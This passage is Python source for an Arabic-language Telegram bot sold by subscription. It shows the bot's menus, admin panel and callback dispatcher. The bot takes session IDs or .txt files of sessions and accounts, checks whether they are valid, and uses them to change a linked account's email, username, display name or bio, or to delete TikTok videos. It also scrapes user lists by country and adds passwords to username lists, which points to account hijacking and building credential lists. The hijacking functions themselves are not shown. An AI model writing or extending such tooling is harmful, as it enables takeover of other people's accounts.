    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📊 إحصائيات عامة", callback_data="general_stats"),
        InlineKeyboardButton("👥 إحصائيات المستخدمين", callback_data="user_stats_detailed"),
        InlineKeyboardButton("💰 إحصائيات الكريدت", callback_data="credits_stats"),
        InlineKeyboardButton("📅 تقرير يومي", callback_data="daily_report_btn"),
        InlineKeyboardButton("🔙 رجوع", callback_data="control_panel")
    )
    return markup

def get_backup_panel():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("💾 نسخ احتياطي الآن", callback_data="backup_now"),
        InlineKeyboardButton("📂 عرض النسخ", callback_data="list_backups"),
        InlineKeyboardButton("🗑️ حذف النسخ القديمة", callback_data="clean_backups"),
        InlineKeyboardButton("🔙 رجوع", callback_data="control_panel")
    )
    return markup

def get_broadcast_panel():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📤 للجميع", callback_data="broadcast_all"),
        InlineKeyboardButton("🔢 بعدد محدد", callback_data="broadcast_number"),
        InlineKeyboardButton("👑 للـ VIP فقط", callback_data="broadcast_vip"),
        InlineKeyboardButton("🔙 رجوع", callback_data="control_panel")
    )
    return markup

def get_sessions_panel():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📥 فحص سيشن فردي", callback_data="check_single"),
        InlineKeyboardButton("📂 فحص ملف سيشنات", callback_data="check_file"),
        InlineKeyboardButton("🔙 رجوع", callback_data="control_panel")
    )
    return markup

def get_quick_commands():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔄 إعادة تشغيل", callback_data="restart_bot"),
        InlineKeyboardButton("⏸️ إيقاف مؤقت", callback_data="pause_bot"),
        InlineKeyboardButton("▶️ تشغيل", callback_data="resume_bot"),
        InlineKeyboardButton("🧹 تنظيف الملفات", callback_data="clean_files"),
        InlineKeyboardButton("🔄 تحديث الميزات", callback_data="refresh_features"),
        InlineKeyboardButton("🔙 رجوع", callback_data="control_panel")
    )
    return markup

def get_manage_users_in_boted_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("فك حظر", callback_data="unban_user"), InlineKeyboardButton("حظر مستخدم", callback_data="ban_user"))
    markup.row(InlineKeyboardButton("عرض المحظورين", callback_data="show_banned_from_bot"))
    markup.add(InlineKeyboardButton("رجوع", callback_data='back_to_admin'))
    return markup

def get_menu_broadcast():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("اذاعه للكل", callback_data="broadcast"), InlineKeyboardButton("اذاعة بالعدد", callback_data="broadcast_number"))
    markup.row(InlineKeyboardButton("اذاعه بالتوحيه", callback_data="broadcast_directing"))
    markup.add(InlineKeyboardButton("رجوع", callback_data='back_to_admin'))
    return markup

def get_vip_menu_markup():
    vip_menu_markup = InlineKeyboardMarkup(row_width=2)
    vip_menu_markup.row(InlineKeyboardButton("اضافه VIP", callback_data="add_vip"), InlineKeyboardButton("حذف VIP", callback_data="remove_vip"))
    vip_menu_markup.row(InlineKeyboardButton("عرض VIP", callback_data="show_vip"))
    vip_menu_markup.row(InlineKeyboardButton("رجوع", callback_data="back_to_admin"))
    return vip_menu_markup

# ==================== هاندلر البداية ====================

@bot.message_handler(commands=['start'])
def start(msg):
    if msg.chat.type != "private":
        return
    save_user_and_notify(msg.from_user)
    if not check_mandatory_subscription(msg):
        return
    if not check_user_access(msg):
        return
    stats = verify_access(msg)
    user_id = msg.from_user.id
    if stats == "admin":
        for cmsg in custom_messages:
            try:
                bot.send_message(user_id, cmsg)
            except:
                pass
        bot.send_message(user_id, f"<b>{owner_e1} مرحباً بك يا مالك البوت\n\nتحكم بالبوت من الأزرار:</b>", reply_markup=get_admin_main_page(), parse_mode="HTML")
    elif stats == "done":
        for cmsg in custom_messages:
            try:
                bot.send_message(user_id, cmsg)
            except:
                pass
        send_main_menu_with_message(user_id)
    elif stats == "not premium":
        for cmsg in custom_messages:
            try:
                bot.send_message(user_id, cmsg)
            except:
                pass
        markup = InlineKeyboardMarkup(row_width=1)
        for admin_id in ADMIN_IDS:
            try:
                admin_info = bot.get_chat(admin_id)
                if admin_info.username:
                    markup.add(InlineKeyboardButton(text=f"تواصل مع {admin_info.first_name}", url=f"tg://user?id={admin_info.id}"))
            except:
                continue
        bot.send_message(user_id, f"<b>{start_e1} اهـلًا بـك\n\n||عذراً، البوت للمشتركين فقط||\n\n💎 للاشتراك تواصل مع الأدمن:</b>", reply_markup=markup, parse_mode="HTML")

# ==================== هاندلر الكول باكات ====================

@bot.callback_query_handler(func=lambda call: True)
def handle_all_callbacks(call):
    chat_id = call.from_user.id
    message_id = call.message.message_id
    user_id = call.from_user.id

    # ====== أوامر الإيقاف ======
    if call.data.startswith("stop_scrape_"):
        scrape_chat_id = int(call.data.split("_")[2])
        if scrape_chat_id in scraping_tasks:
            scraping_tasks[scrape_chat_id].stop_scraping = True
            bot.answer_callback_query(call.id, "🛑 جاري ايقاف السحب...", show_alert=True)
            try:
                bot.edit_message_reply_markup(chat_id, message_id, reply_markup=None)
            except:
                pass
        return

    # ====== أوامر المستخدمين ======
    if call.data in ["check_single", "check_file", "check_accounts_file", "check_subscription_click", "username_check", "session_advanced_check", "unfollow_new", "change_username_btn", "scrape_menu", "scrape_list", "add_password", "change_email", "change_display_name", "change_all"]:
        if call.data == "check_subscription_click":
            if check_mandatory_subscription(call.message):
                bot.answer_callback_query(call.id, "✅ تم التحقق بنجاح!", show_alert=True)
                try:
                    bot.delete_message(chat_id, message_id)
                except:
                    pass
                send_main_menu_with_message(chat_id)
            else:
                bot.answer_callback_query(call.id, "❌ لم تشترك في جميع القنوات!", show_alert=True)
            return
        if not check_user_access(call.message):
            bot.answer_callback_query(call.id, "❌ ليس لديك صلاحية.", show_alert=True)
            return
        
        if call.data == "check_single":
            user_states[user_id] = "single"
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, f"<b>{emoji1} أرسل السيشن الفردي للفحص:</b>", parse_mode="HTML")
            bot.register_next_step_handler(msg, ask_for_session)
        elif call.data == "check_file":
            user_states[user_id] = "file"
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, f"<b>{emoji2} أرسل ملف السيشنات بصيغة .txt</b>", parse_mode="HTML")
            bot.register_next_step_handler(msg, ask_for_file)
        elif call.data == "check_accounts_file":
            user_states[user_id] = "accounts_file"
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, f"<b>{emoji3} أرسل ملف الحسابات بصيغة .txt</b>", parse_mode="HTML")
            bot.register_next_step_handler(msg, ask_for_accounts_file)
        elif call.data == "scrape_menu":
            markup = InlineKeyboardMarkup(row_width=1)
            markup.add(
                InlineKeyboardButton("سحب لسته", callback_data="scrape_list"),
                InlineKeyboardButton("اضافه باسوورد", callback_data="add_password"),
                InlineKeyboardButton("رجوع", callback_data="habit_board_start")
            )
            bot.edit_message_text(f"<b>{emoji_download} اختر العملية:</b>", chat_id, message_id, reply_markup=markup, parse_mode="HTML")
            return
        elif call.data == "scrape_list":
            if user_id in scraping_tasks and scraping_tasks[user_id] and not scraping_tasks[user_id].stop_scraping:
                bot.answer_callback_query(call.id, "⚠️ يوجد سحب نشط بالفعل!", show_alert=True)
                return
            user_states[user_id] = "scrape_list"
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, f"<b>{emoji_globe} أرسل رمز الدولة (مثال: IQ, US, SA, KW):</b>", parse_mode="HTML")
            bot.register_next_step_handler(msg, process_scrape_region)
            return
        elif call.data == "add_password":
            user_states[user_id] = "add_password"
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, f"<b>{emoji_lock} أرسل ملف اليوزرات بصيغة .txt</b>", parse_mode="HTML")
            bot.register_next_step_handler(msg, process_add_password_file)
            return
        elif call.data == "username_check":
            user_states[user_id] = "username"
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, f"<b>{emoji2} أرسل @username للفحص المتقدم</b>", parse_mode="HTML")
            bot.register_next_step_handler(msg, process_username_check)
        elif call.data == "session_advanced_check":
            user_states[user_id] = "session_advanced"
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, f"<b>{emoji1} أرسل Session ID للفحص المتقدم</b>", parse_mode="HTML")
            bot.register_next_step_handler(msg, process_session_advanced_check)
        elif call.data == "unfollow_new":
            user_states[user_id] = "unfollow_new"
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, f"<b>{emoji1} أرسل Session ID للغاء المتابعة:</b>", parse_mode="HTML")
            bot.register_next_step_handler(msg, process_unfollow_new)
        elif call.data == "change_username_btn":
            user_states[user_id] = "change_username"
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, f"<b>{emoji1} أرسل Session ID:</b>", parse_mode="HTML")
            bot.register_next_step_handler(msg, process_change_username)
        elif call.data == "change_email":
            user_states[user_id] = "change_email"
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, f"<b>{emoji1} أرسل السيشن:</b>", parse_mode="HTML")
            bot.register_next_step_handler(msg, ask_for_email_change)
        elif call.data == "change_display_name":
            user_states[user_id] = "change_display_name"
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, f"<b>{emoji1} أرسل السيشن:</b>", parse_mode="HTML")
            bot.register_next_step_handler(msg, ask_for_display_name_change)
        elif call.data == "change_all":
            user_states[user_id] = "change_all"
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, f"<b>{emoji1} أرسل السيشن:</b>", parse_mode="HTML")
            bot.register_next_step_handler(msg, ask_for_all_change)
        return

    # ====== أوامر TikTok ======
    if call.data in ["tiktok_private", "tiktok_cancel_repost", "tiktok_cancel_favo", "make_videos_public"]:
        if not check_user_access(call.message):
            bot.answer_callback_query(call.id, "❌ ليس لديك صلاحية.", show_alert=True)
            return
        tool_names = {
            "tiktok_private": "جعل الفيديوهات خاصة",
            "tiktok_cancel_repost": "الغاء اعادة النشر",
            "tiktok_cancel_favo": "الغاء المفضلة",
            "make_videos_public": "جعل الفيديوهات عامة"
        }
        user_states[user_id] = call.data
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, f"<b>{emoji1} أرسل السيشن لبدء {tool_names[call.data]}:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, ask_for_tiktok_session)
        return

    if call.data in ["session_info", "delete_videos"]:
        if not check_user_access(call.message):
            bot.answer_callback_query(call.id, "❌ ليس لديك صلاحية.", show_alert=True)
            return
        tool_descriptions = {"session_info": "معلومات الحساب", "delete_videos": "حذف الفيديوهات"}
        user_states[user_id] = call.data
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, f"<b>{emoji1} أرسل السيشن لبدء {tool_descriptions[call.data]}:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, ask_for_new_tool_session)
        return

    if call.data == "change_bio":
        if not check_user_access(call.message):
            bot.answer_callback_query(call.id, "❌ ليس لديك صلاحية.", show_alert=True)
            return
        user_states[user_id] = "change_bio"
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, f"<b>{emoji1} أرسل البايو الجديد:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, ask_for_new_bio)
        return

    if call.data == "bind_email_action":
        if not check_user_access(call.message):
            bot.answer_callback_query(call.id, "❌ ليس لديك صلاحية.", show_alert=True)
            return
        user_states[user_id] = "bind_email"
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, f"<b>{emoji1} أرسل الايميل للربط:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, ask_for_email)
        return

    # ====== لوحة التحكم المتقدمة (للمالك فقط) ======
    if user_id not in ADMIN_IDS:
        # إذا كان المستخدم عادي ويضغط على زر المالك
        if call.data in ["control_panel", "features_panel", "users_panel", "credits_panel", "stats_panel", "backup_panel", "sessions_panel", "quick_commands"]:
            bot.answer_callback_query(call.id, "❌ هذه اللوحة للمالك فقط.", show_alert=True)
            return
        # السماح للمستخدمين العاديين بالوصول لباقي الأزرار
        if call.data in ["list_users", "ban_user_btn", "unban_user_btn", "add_vip_btn", "remove_vip_btn", "general_stats", "user_stats_detailed", "credits_stats", "daily_report_btn", "show_credits", "credits_ranking", "backup_now", "list_backups", "clean_backups", "broadcast_all", "broadcast_number", "broadcast_vip", "restart_bot", "pause_bot", "resume_bot", "clean_files", "refresh_features"]:
            bot.answer_callback_query(call.id, "❌ هذه الأزرار للمالك فقط.", show_alert=True)
            return

    # ====== لوحة التحكم ======
    if call.data == "control_panel":
        bot.edit_message_text(
            f"<b>🎮 لوحة التحكم الرئيسية</b>\n\nاختر القسم الذي تريد التحكم به:",
            chat_id, message_id,
            reply_markup=get_control_panel(),
            parse_mode="HTML"
        )

    elif call.data == "features_panel":
        features = load_features()
        text = "<b>⚙️ إدارة الميزات</b>\n\n"
        for name, data in features.items():
            status = "🟢 مفعل" if data['enabled'] else "🔴 معطل"
            text += f"{data['name']}: {status}\n"
        bot.edit_message_text(
            text,
            chat_id, message_id,
            reply_markup=get_features_panel(),
            parse_mode="HTML"
        )

    elif call.data.startswith("toggle_feature_"):
        feature_name = call.data.replace("toggle_feature_", "")
        new_status = toggle_feature(feature_name)
        status_text = "مفعلة" if new_status else "معطلة"
        bot.answer_callback_query(call.id, f"✅ تم {status_text} الميزة!", show_alert=True)
        features = load_features()
        text = "<b>⚙️ إدارة الميزات</b>\n\n"
        for name, data in features.items():
            status = "🟢 مفعل" if data['enabled'] else "🔴 معطل"
            text += f"{data['name']}: {status}\n"
        bot.edit_message_text(
            text,
            chat_id, message_id,
            reply_markup=get_features_panel(),
            parse_mode="HTML"
        )

    elif call.data == "users_panel":
        bot.edit_message_text(
            f"<b>👥 إدارة المستخدمين</b>\n\nاختر العملية المطلوبة:",
            chat_id, message_id,
            reply_markup=get_users_panel(),
            parse_mode="HTML"
        )

    elif call.data == "credits_panel":
        bot.edit_message_text(
            f"<b>💰 نظام الكريدت</b>\n\nإدارة نقاط المستخدمين:",
            chat_id, message_id,
            reply_markup=get_credits_panel(),
            parse_mode="HTML"
        )

    elif call.data == "stats_panel":
        bot.edit_message_text(
            f"<b>📊 الإحصائيات</b>\n\nاختر نوع الإحصائيات:",
            chat_id, message_id,
            reply_markup=get_stats_panel(),
            parse_mode="HTML"
        )

    elif call.data == "backup_panel":
        bot.edit_message_text(
            f"<b>💾 النسخ الاحتياطي</b>\n\nإدارة نسخ الاحتياطي:",
            chat_id, message_id,
            reply_markup=get_backup_panel(),
            parse_mode="HTML"
        )

    elif call.data == "broadcast_panel":
        bot.edit_message_text(
            f"<b>📤 الإذاعة</b>\n\nاختر نوع الإذاعة:",
            chat_id, message_id,
            reply_markup=get_broadcast_panel(),
            parse_mode="HTML"
        )

    elif call.data == "sessions_panel":
        bot.edit_message_text(
            f"<b>🔑 إدارة السيشنات</b>\n\nاختر العملية:",
            chat_id, message_id,
            reply_markup=get_sessions_panel(),
            parse_mode="HTML"
        )

    elif call.data == "quick_commands":
        bot.edit_message_text(
            f"<b>⚡ الأوامر السريعة</b>\n\nنفذ الأوامر بضغطة زر:",
            chat_id, message_id,
            reply_markup=get_quick_commands(),
            parse_mode="HTML"
        )

    elif call.data == "list_users":
        users = open('id.txt').read().splitlines()
        total = len(users)
        vip = get_all_vip()
        banned = banned_from_bot
        
        text = f"<b>👥 المستخدمين:</b>\n\n"
        text += f"📊 الإجمالي: {total}\n"
        text += f"👑 VIP: {len(vip)}\n"
        text += f"🚫 محظور: {len(banned)}\n\n"
        
        if users:
            text += "<b>آخر 10 مستخدمين:</b>\n"
            for uid in users[-10:]:
                try:
                    user = bot.get_chat(int(uid))
                    name = user.first_name or uid
                    text += f"• {name} (<code>{uid}</code>)\n"
                except:
                    text += f"• <code>{uid}</code>\n"
        
        markup = InlineKeyboardMarkup().add(
            InlineKeyboardButton("🔙 رجوع", callback_data="users_panel")
        )
        bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode="HTML")

    elif call.data == "ban_user_btn":
        msg = bot.send_message(chat_id, "<b>🚫 أرسل ايدي المستخدم للحظر:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, ban_user_step)
        bot.answer_callback_query(call.id)

    elif call.data == "unban_user_btn":
        msg = bot.send_message(chat_id, "<b>✅ أرسل ايدي المستخدم لفك الحظر:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, unban_user_step)
        bot.answer_callback_query(call.id)

    elif call.data == "add_vip_btn":
        msg = bot.send_message(chat_id, "<b>👑 أرسل ايدي المستخدم لإضافة VIP:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, add_vip_step)
        bot.answer_callback_query(call.id)

    elif call.data == "remove_vip_btn":
        msg = bot.send_message(chat_id, "<b>❌ أرسل ايدي المستخدم لحذف VIP:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, remove_vip_step)
        bot.answer_callback_query(call.id)

    elif call.data == "general_stats":
        stats = get_stats()
        total = count_subscribers()
        vip = len(get_all_vip())
        credits = load_credits()
        total_credits = sum(credits.values())
        
        text = f"<b>📊 الإحصائيات العامة</b>\n\n"
        text += f"👥 المشتركين: {total}\n"
        text += f"👑 VIP: {vip}\n"
        text += f"🚫 محظورين: {len(banned_from_bot)}\n"
        text += f"✅ سيشنات صالحة: {stats.get('valid', 0)}\n"
        text += f"❌ سيشنات فاشلة: {stats.get('invalid', 0)}\n"
        text += f"💰 الكريدت الكلي: {total_credits:,}\n"
        text += f"📁 عدد الملفات: {len(os.listdir('.'))}\n"
        
        markup = InlineKeyboardMarkup().add(
            InlineKeyboardButton("🔙 رجوع", callback_data="stats_panel")
        )
        bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode="HTML")

    elif call.data == "backup_now":
        auto_backup()
        bot.answer_callback_query(call.id, "✅ تم إنشاء نسخة احتياطية!", show_alert=True)

    elif call.data == "list_backups":
        if os.path.exists(BACKUP_DIR):
            backups = sorted([f for f in os.listdir(BACKUP_DIR) if f.startswith('sessions_backup_')])
            if backups:
                text = "<b>📂 النسخ الاحتياطية:</b>\n\n"
                for i, backup in enumerate(backups[-10:], 1):
                    size = os.path.getsize(os.path.join(BACKUP_DIR, backup)) / 1024
                    text += f"{i}. {backup} ({size:.1f} KB)\n"
            else:
                text = "لا توجد نسخ احتياطية"
        else:
            text = "لا يوجد مجلد للنسخ الاحتياطية"
        
        markup = InlineKeyboardMarkup().add(
            InlineKeyboardButton("🔙 رجوع", callback_data="backup_panel")
        )
        bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode="HTML")

    elif call.data == "clean_backups":
        if os.path.exists(BACKUP_DIR):
            backups = sorted([f for f in os.listdir(BACKUP_DIR) if f.startswith('sessions_backup_')])
            if len(backups) > 5:
                for backup in backups[:-5]:
                    os.remove(os.path.join(BACKUP_DIR, backup))
                bot.answer_callback_query(call.id, f"✅ تم حذف {len(backups)-5} نسخة قديمة!", show_alert=True)
            else:
                bot.answer_callback_query(call.id, "✅ لا توجد نسخ قديمة للحذف!", show_alert=True)
        else:
            bot.answer_callback_query(call.id, "❌ لا توجد نسخ!", show_alert=True)

    elif call.data == "broadcast_all":
        msg = bot.send_message(chat_id, "<b>📤 أرسل الرسالة للإذاعة للجميع:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, broadcast_message_handler)
        bot.answer_callback_query(call.id)

    elif call.data == "broadcast_number":
        msg = bot.send_message(chat_id, "<b>🔢 أرسل عدد الأشخاص:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, get_broadcast_limit)
        bot.answer_callback_query(call.id)

    elif call.data == "broadcast_vip":
        msg = bot.send_message(chat_id, "<b>👑 أرسل الرسالة لـ VIP:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, broadcast_vip_handler)
        bot.answer_callback_query(call.id)

    elif call.data == "show_credits":
        credits = load_credits()
        text = "<b>💎 نظام الكريدت</b>\n\n"
        total_users = len(credits)
        total_credits = sum(credits.values())
        text += f"👥 عدد المستخدمين: {total_users}\n"
        text += f"💰 مجموع الكريدت: {total_credits:,}\n\n"
        text += "<b>أعلى 10 مستخدمين:</b>\n"
        sorted_users = sorted(credits.items(), key=lambda x: x[1], reverse=True)[:10]
        for i, (uid, amount) in enumerate(sorted_users, 1):
            try:
                user = bot.get_chat(int(uid))
                name = user.first_name or uid
            except:
                name = uid
            text += f"{i}. {name}: <code>{amount:,}</code>\n"
        
        markup = InlineKeyboardMarkup().add(
            InlineKeyboardButton("🔙 رجوع", callback_data="credits_panel")
        )
        bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode="HTML")

    elif call.data == "add_credits_btn":
        msg = bot.send_message(chat_id, "<b>➕ أرسل: ايدي المستخدم + الكمية</b>\nمثال: <code>123456789 100</code>", parse_mode="HTML")
        bot.register_next_step_handler(msg, add_credits_step)
        bot.answer_callback_query(call.id)

    elif call.data == "remove_credits_btn":
        msg = bot.send_message(chat_id, "<b>➖ أرسل: ايدي المستخدم + الكمية</b>\nمثال: <code>123456789 50</code>", parse_mode="HTML")
        bot.register_next_step_handler(msg, remove_credits_step)
        bot.answer_callback_query(call.id)

    elif call.data == "credits_ranking":
        credits = load_credits()
        text = "<b>🏆 ترتيب المستخدمين حسب الكريدت</b>\n\n"
        sorted_users = sorted(credits.items(), key=lambda x: x[1], reverse=True)[:20]
        if sorted_users:
            for i, (uid, amount) in enumerate(sorted_users, 1):
                try:
                    user = bot.get_chat(int(uid))
                    name = user.first_name or uid
                except:
                    name = uid
                text += f"{i}. {name}: <code>{amount:,}</code>\n"
        else:
            text += "لا يوجد مستخدمين"
        
        markup = InlineKeyboardMarkup().add(
            InlineKeyboardButton("🔙 رجوع", callback_data="credits_panel")
        )
        bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode="HTML")

    elif call.data == "restart_bot":
        bot.answer_callback_query(call.id, "🔄 جاري إعادة تشغيل البوت...", show_alert=True)
        os.system("pkill -f bot.py")
        time.sleep(1)
        os.system("python3 bot.py &")
        bot.send_message(chat_id, "✅ تم إعادة تشغيل البوت!")

    elif call.data == "pause_bot":
        stats = get_stats()
        stats['is_bot_active'] = False
        with open(STATS_FILE, "w") as f:
            json.dump(stats, f)
        bot.answer_callback_query(call.id, "⏸️ تم إيقاف البوت مؤقتاً!", show_alert=True)

    elif call.data == "resume_bot":
        stats = get_stats()
        stats['is_bot_active'] = True
        with open(STATS_FILE, "w") as f:
            json.dump(stats, f)
        bot.answer_callback_query(call.id, "▶️ تم تشغيل البوت!", show_alert=True)

    elif call.data == "clean_files":
        try:
            # تنظيف الملفات المؤقتة
            files = os.listdir('.')
            deleted = 0
            for f in files:
                if f.startswith('scraped_') or f.startswith('results_') or f.startswith('with_password_'):
                    if f.endswith('.txt'):
                        os.remove(f)
                        deleted += 1
            bot.answer_callback_query(call.id, f"✅ تم حذف {deleted} ملف مؤقت!", show_alert=True)
        except Exception as e:
            bot.answer_callback_query(call.id, f"❌ خطأ: {e}", show_alert=True)

    elif call.data == "refresh_features":
        load_features()
        bot.answer_callback_query(call.id, "✅ تم تحديث الميزات!", show_alert=True)

    # ====== الأزرار القديمة ======
    if user_id not in ADMIN_IDS:
        return

    if call.data == "vip_menu":
        bot.edit_message_text(f"<b>{emoji_diamond} قسم VIP</b>", chat_id, message_id, reply_markup=get_vip_menu_markup(), parse_mode="HTML")
    elif call.data == "add_vip":
        msg = bot.send_message(chat_id, "<b>🆔 أرسل ايدي المستخدم:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, add_vip_step)
    elif call.data == "remove_vip":
        msg = bot.send_message(chat_id, "<b>🆔 أرسل ايدي المستخدم:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, remove_vip_step)
    elif call.data == "show_vip":
        v_text = "\n".join(get_all_vip()) or "لا يوجد"
        back_btn = InlineKeyboardMarkup().add(InlineKeyboardButton("رجوع", callback_data="vip_menu"))
        bot.edit_message_text(f"<b>{emoji_list} قائمة VIP:\n\n{v_text}</b>", chat_id, message_id, reply_markup=back_btn, parse_mode="HTML")
    elif call.data == "toggle_mode":
        nm = toggle_mode()
        bot.answer_callback_query(call.id, f"✅ تم تحويل الوضع إلى: {translate_mode(nm)}", show_alert=True)
        bot.edit_message_text(f"<b>{owner_e1} مرحباً بك يا مالك البوت</b>", chat_id, message_id, reply_markup=get_admin_main_page(), parse_mode="HTML")
    elif call.data == "show_number_ad":
        total = count_subscribers()
        vip_count = len(get_all_vip())
        bot.answer_callback_query(call.id, f"👥 المشتركين: {total}\n👑 VIP: {vip_count}", show_alert=True)
    elif call.data == "show_oo":
        bot.edit_message_text(f"<b>{emoji_ban} قسم الحظر:</b>", chat_id, message_id, reply_markup=get_manage_users_in_boted_menu(), parse_mode="HTML")
    elif call.data == "ban_user":
        msg = bot.send_message(chat_id, "<b>🆔 أرسل الايدي:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, ban_user_step)
    elif call.data == "unban_user":
        msg = bot.send_message(chat_id, "<b>🆔 أرسل الايدي:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, unban_user_step)
    elif call.data == "show_banned_from_bot":
        banned_list = "\n".join([f"{i+1}- <code>{u}</code>" for i, u in enumerate(banned_from_bot)]) if banned_from_bot else "لا يوجد محظورين"
        back_btn = InlineKeyboardMarkup().add(InlineKeyboardButton("رجوع", callback_data="show_oo"))
        bot.edit_message_text(f"<b>{emoji_ban} المحظورين:\n{banned_list}</b>", chat_id, message_id, reply_markup=back_btn, parse_mode="HTML")
    elif call.data == "menu_broadcast":
        bot.edit_message_text(f"<b>{emoji2} قسم الإذاعة:</b>", chat_id, message_id, reply_markup=get_menu_broadcast(), parse_mode="HTML")
    elif call.data == "broadcast":
        msg = bot.send_message(chat_id, "<b>✉️ أرسل الرسالة:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, broadcast_message_handler)
    elif call.data == "broadcast_number":
        msg = bot.send_message(chat_id, "<b>🔢 أرسل عدد الأشخاص:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, get_broadcast_limit)
    elif call.data == "broadcast_directing":
        msg = bot.send_message(chat_id, "<b>📤 أرسل الرسالة:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, broadcast_directing_handler)
    elif call.data == "channel_number":
        channel_number_qn(call)
    elif call.data == "qn":
        msg = bot.send_message(chat_id, f"<b>{emoji4} أرسل معرف القناة:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, add_channel_step)
    elif call.data == "delqn":
        msg = bot.send_message(chat_id, f"<b>{emoji_ban} أرسل معرف القناة:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, del_channel_step)
    elif call.data == "listqn":
        show_channels_list(call)
    elif call.data == "set_message_menu":
        set_message_start_menu(call)
    elif call.data == "set_message":
        msg = bot.send_message(chat_id, f"<b>{emoji3} أرسل الكليشة:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, save_custom_message_step)
    elif call.data == "delete_message":
        global custom_messages
        custom_messages = []
        bot.answer_callback_query(call.id, "✅ تم مسح الرسائل.", show_alert=True)
    elif call.data == "view_messages":
        msgs_text = "\n\n".join([f"{i+1}- {m[:100]}..." for i, m in enumerate(custom_messages)]) if custom_messages else "لا توجد رسائل"
        back_btn = InlineKeyboardMarkup().add(InlineKeyboardButton("رجوع", callback_data="set_message_menu"))
        bot.edit_message_text(f"<b>{emoji3} الرسائل:\n\n{msgs_text}</b>", chat_id, message_id, reply_markup=back_btn, parse_mode="HTML")
    elif call.data == "GetFiles":
        try:
            if os.path.exists('id.txt') and os.path.getsize('id.txt') > 0:
                bot.send_document(chat_id, open('id.txt', 'rb'), caption='👥 ملف المشتركين')
            if os.path.exists(VIP_FILE) and os.path.getsize(VIP_FILE) > 0:
                bot.send_document(chat_id, open(VIP_FILE, 'rb'), caption='👑 ملف VIP')
            bot.answer_callback_query(call.id, "✅ تم إرسال الملفات.")
        except Exception as e:
            bot.send_message(chat_id, f"<b>{emoji_ban} حدث خطأ: {e}</b>", parse_mode="HTML")
    elif call.data == "admin_stats":
        stats_data = get_stats()
        total = count_subscribers()
        vip_count = len(get_all_vip())
        text = f"<b>{emoji_search} الإحصائيات:\n\n👥 المشتركين: {total}\n👑 VIP: {vip_count}\n🚫 المحظورين: {len(banned_from_bot)}\n✅ صالحة: {stats_data.get('valid', 0)}\n❌ فاشلة: {stats_data.get('invalid', 0)}\n🔄 البوت: {'🟢 مفعل' if stats_data.get('is_bot_active', True) else '🔴 معطل'}</b>"
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, text, parse_mode="HTML")
    elif call.data == "back_to_admin":
        bot.edit_message_text(f"<b>{owner_e1} مرحباً بك يا مالك البوت</b>", chat_id, message_id, reply_markup=get_admin_main_page(), parse_mode="HTML")
    elif call.data == "habit_board_start":
        send_main_menu_with_message(chat_id)

# ==================== دوال المستخدمين ====================

def ban_user_step(message):
    if message.text.strip().isdigit():
        uid = int(message.text.strip())
        if uid not in banned_from_bot:
            banned_from_bot.append(uid)
            open(BANNED_FILE, "a").write(str(uid) + "\n")
        bot.send_message(message.chat.id, f"<b>{emoji_check} تم حظر {uid}</b>", parse_mode="HTML")
    else:
        bot.send_message(message.chat.id, f"<b>{emoji_ban} أرقام فقط.</b>", parse_mode="HTML")

def unban_user_step(message):
    if message.text.strip().isdigit():
        uid = int(message.text.strip())
        if uid in banned_from_bot:
            banned_from_bot.remove(uid)
        try:
            lines = open(BANNED_FILE, "r").readlines()
            open(BANNED_FILE, "w").writelines(l for l in lines if l.strip() != str(uid))
        except:
            pass
        bot.send_message(message.chat.id, f"<b>{emoji_check} تم فك حظر {uid}</b>", parse_mode="HTML")
    else:
